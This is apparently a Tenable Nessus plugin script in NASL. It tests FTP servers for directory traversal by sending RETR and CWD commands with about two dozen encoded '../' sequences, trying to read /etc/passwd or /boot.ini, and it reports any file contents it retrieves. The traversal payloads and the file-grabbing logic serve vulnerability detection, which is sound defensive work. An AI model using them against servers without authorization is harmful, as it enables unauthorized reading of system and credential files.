#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50811);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_bugtraq_id(39919, 40419, 44543, 44574, 44759, 46165);
  script_osvdb_id(65463, 68959, 69348, 70776, 73580);
  script_xref(name:"EDB-ID", value:"12498");
  script_xref(name:"EDB-ID", value:"15358");
  script_xref(name:"EDB-ID", value:"15349");
  script_xref(name:"EDB-ID", value:"15445");
  script_xref(name:"EDB-ID", value:"15450");
  script_xref(name:"EDB-ID", value:"16105");

  script_name(english:"FTP Server Traversal Arbitrary File Access (RETR)");
  script_summary(english:"Attempts to retrieve file outside document directory.");

  script_set_attribute(attribute:"synopsis", value:"The remote FTP server is susceptible to a directory traversal attack.");
  script_set_attribute(attribute:"description", value:
"The remote FTP server allows a user to retrieve files outside his home
directory using a specially crafted 'RETR' command with traversal
sequences.

A remote attacker could exploit this flaw to gain access to arbitrary
files.");
  script_set_attribute(attribute:"solution", value:
"Contact the vendor for an update, use a different product, or disable
the service altogether.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'QuickShare File Server 1.2.1 Directory Traversal Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/24");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}

include("audit.inc");
include("ftp_func.inc");
include("global_settings.inc");
include("misc_func.inc");

port = get_ftp_port(default: 21);

global_var soc;
soc = "";


encaps = get_port_transport(port);
_errmsg = "";

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";

traversals = make_list(
  "",                                  # nb: to ensure the server doesn't start at the root.
  mult_str(str:"../", nb:12),
  mult_str(str:"..\", nb:12),
  mult_str(str:"..%2f", nb:12),
  mult_str(str:"..%5c", nb:12),
  mult_str(str:".../", nb:12),
  mult_str(str:"...\", nb:12),
  mult_str(str:"...%2f", nb:12),
  mult_str(str:"...%5c", nb:12),
  mult_str(str:"..//", nb:12),
  mult_str(str:"..\\", nb:12),
  mult_str(str:"../\", nb:12),
  mult_str(str:"..\/", nb:12),
  mult_str(str:"..///", nb:12),
  mult_str(str:"../\/", nb:12),
  mult_str(str:"./../", nb:12),
  mult_str(str:".\..\", nb:12),
  "/"+mult_str(str:"../", nb:12),
  "\"+mult_str(str:"..\", nb:12),
  "...",
  "/...",
  "/......",
  "\...",
  "...\",
  "..../",
  "C:\"
);

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if (isnull(user) && isnull(pass) && !supplied_logins_only)
{
  user = 'anonymous';
  pass = 'nessus@' + this_host();
}
else if (isnull(user) && isnull(pass) && supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

function authenticate()
{
  if (soc)
  {
    ftp_close(socket:soc);
    sleep(1);
  }

  soc = open_sock_tcp(port);
  if (!soc)
  {
    _errmsg = "Failed to open a socket on port "+port+".";
    return NULL;
  }

  if (!ftp_authenticate(socket:soc, user:user, pass:pass))
  {
    _errmsg = "Nessus was not able to log in to the FTP server on port "+port+" using the supplied credentials ('"+user+"' / '"+pass+"').";
    return NULL;
  }

  return soc;
}

function get_file(get)
{
  local_var c, f, port2, retry, s, soc2;

  if (!get) return "";

  for (retry=0; retry<3 && !port2; retry++)
  {
    port2 = ftp_pasv(socket:soc);
    if (!port2) sleep(1);
  }

  if (!port2)
  {
    _errmsg = "PASV command failed on port "+port+".";
    return NULL;
  }

  soc2 = open_sock_tcp(port2, transport:encaps);
  if (!soc2)
  {
    _errmsg = "Failed to open a socket on PASV port "+port2+".";
    return NULL;
  }

  c = get;
  s = ftp_send_cmd(socket:soc, cmd:c);
  if (strlen(s) < 4)
  {
    close(soc2);

    if (strlen(s)) _errmsg = "The FTP server on port "+port+" returned an invalid response (" + s + ").";
    else _errmsg = "The FTP server on port" +port + " did not respond.";
    return NULL;
  }
  else if (!egrep(string:s, pattern:"^(425|150) "))
  {
    close(soc2);
    if (!egrep(string:s, pattern:"^(500|550) ")) soc = authenticate();
    return "";
  }

  f = ftp_recv_data(socket:soc2, line:s);
  if (isnull(f)) f = "";
  s = ftp_recv_line(socket:soc);

  close(soc2);
  return f;
}

# Try to retrieve a local file.
contents = "";
exploits = make_list();
found_file = "";

soc = authenticate();
if (!soc) exit(1, _errmsg);

foreach traversal (traversals)
{
  if (ereg(pattern:"^[A-Za-z]:", string:traversal) && os && "Windows" >!< os) continue;

  foreach file (files)
  {
    # Once we find a file that works, stick with it for any subsequent tests.
    if (found_file && file != found_file) continue;

    get = "RETR " + traversal;
    if (
      (traversal && ereg(pattern:"[/\\]$", string:traversal)) &&
      ereg(pattern:"^/", string:file)
    ) get += substr(file, 1);
    else get += file;

    res = get_file(get:get);
    if (isnull(res)) break;
    if (!res) continue;

    if (!traversal) exit(1, "The FTP server listening on port "+port+" serves files from the root directory.");

    if (egrep(pattern:file_pats[file], string:res))
    {
      if (!contents)
      {
        contents = res;
        found_file = file;
      }
      exploits = make_list(
        exploits,
        ereg_replace(pattern:"^RETR(.+)$", replace:"get\1", string:get)
      );
      break;
    }
  }
  if (contents && !thorough_tests) break;
  if (_errmsg) break;

  if (!traversal) continue;

  soc = authenticate();
  if (!soc) break;

  c = "CWD " + traversal;
  s = ftp_send_cmd(socket:soc, cmd:c);

  if (strlen(s) < 4)
  {
    if (strlen(s)) _errmsg = "The FTP server on port "+port+" returned an invalid response (" + s + ").";
    else _errmsg = "Failed to receive a response from the FTP server on port " +port + ".";
    break;
  }
  if (!egrep(string:s, pattern:"^250 "))
  {
    if (!egrep(string:s, pattern:"^(500|550) "))
    {
      soc = authenticate();
      if (!soc) break;
    }
    continue;
  }

  foreach file (files)
  {
    # Once we find a file that works, stick with it for any subsequent tests.
    if (found_file && file != found_file) continue;

    get = "RETR " + substr(file, 1);

    res = get_file(get:get);
    if (isnull(res)) break;
    if (!res) continue;

    if (egrep(pattern:file_pats[file], string:res))
    {
      if (!contents)
      {
        contents = res;
        found_file = file;
      }
      exploits = make_list(
        exploits,
        "cd " + traversal + '\n' + 'get ' + substr(file, 1)
      );
      break;
    }
  }
  if (contents && !thorough_tests) break;
  if (_errmsg) break;

  soc = authenticate();
  if (!soc) break;
}
if (max_index(exploits) == 0)
{
  if (_errmsg) exit(1, _errmsg);
  else exit(0, "The FTP server on port "+port+" does not appear to be affected.");
}

# Report findings.
if (report_verbosity > 0)
{
  if (max_index(exploits) > 1) s = "s";
  else s = "";

  report = '\n' +
    'Nessus was able to exploit the issue to retrieve the contents of\n' +
    "'" + found_file + "' on the remote host using the following FTP command" + s + ' :\n' +
    '\n';
  foreach exploit (exploits)
  {
    exploit = str_replace(find:'\n', replace:'\n    ', string:exploit);
    report += '  - ' + exploit + '\n';
  }

  if (report_verbosity > 1)
  {
    # nb: we'll make sure contents has a newline.
    contents = chomp(contents) + '\n';

    report += '\n' +
      'Here are its contents :\n' +
      '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
      contents +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  }

  if (_errmsg)
  {
    report += '\n' +
      'Note that Nessus encountered the following error and did not finish\n' +
      'completely testing the service :\n' +
      '\n' +
      '  ' + _errmsg + '\n';
    if ("using the supplied credentials" >< _errmsg)
    {
      report += '\n' +
        'This plugin re-authenticates after each attempt to retrieve a file,\n' +
        'and a sporadic authentication failure such as this likely occurs\n' +
        'because the target service does not handle multiple users well.\n';
    }
  }

  security_warning(port:port, extra:report);
}
else security_warning(port);
